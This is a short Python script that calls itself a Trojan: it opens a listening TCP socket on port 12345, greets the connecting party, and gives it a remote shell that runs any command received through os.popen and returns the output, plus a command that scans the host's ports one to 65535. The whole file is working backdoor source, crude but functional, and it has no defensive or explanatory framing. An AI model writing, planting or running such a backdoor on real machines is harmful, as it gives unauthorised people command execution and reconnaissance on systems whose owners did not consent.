import sys
sys.path.append("./tools/")
import socket
import os

def open(ip,port):
    s=socket.socket()
    try:
        s.connect((ip,port))
        return True
    except:
        return False

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host='127.0.0.1'
    port=12345
    s.bind((host,port))
    s.listen(5)
    while True:
        c,addr=s.accept()
        c.send("Trojan is On! Success!".encode("utf-8"))
        c.send("You can input your command now!".encode("utf-8"))
        while True:
            try:
                recv_data=c.recv(1024).decode("utf-8")
                if recv_data == 'exit':
                    c.send("Stop success".encode("utf-8"))
                    break
                elif recv_data == 'shell':
                    c.send("You can now input the command of shell".encode("utf-8"))
                    while True:
                        command=c.recv(1024).decode("utf-8")
                        if command == 'exit':
                            c.send("Bye_shell".encode("utf-8"))
                            break
                        result = os.popen(command).read()
                        if result=='':
                            c.send("Error".encode("utf-8"))
                            continue
                        c.send(result.encode("utf-8"))
                elif recv_data == 'scan':
                    c.send("scan_now".encode("utf-8"))
                    for x in range(1,65535):
                        if open(host,x):
                           c.send(("This host's port %s is open"%x).encode("utf-8"))
                    c.send("Finished!".encode("utf-8"))
            except:
                break
        c.close()
    s.close()

if __name__ == '__main__':
    main()